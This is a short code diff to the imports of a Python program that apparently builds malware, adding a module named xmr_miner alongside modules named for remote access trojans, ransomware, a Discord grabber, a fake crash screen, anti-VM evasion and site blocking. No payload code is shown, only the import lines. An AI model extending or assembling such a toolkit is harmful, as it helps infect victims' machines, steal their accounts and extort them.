@@ -19,15 +19,7 @@ from PIL import ImageGrab
 
 # Header imports
 
-from bin import rose_rat
-from bin import InjectX
-from bin import knight_rat
-from bin import block_sites
-from bin import discordc
-from bin import _roblox
-from bin import tbsod
-from bin import doggo_ransomware
-from bin import antivm
+from bin import xmr_miner, InjectX, rose_rat, knight_rat, block_sites, discordc, _roblox, tbsod, antivm, doggo_ransomware
 from bin import _startup as startup
 from bin.games import get_games
 from bin.config import Config
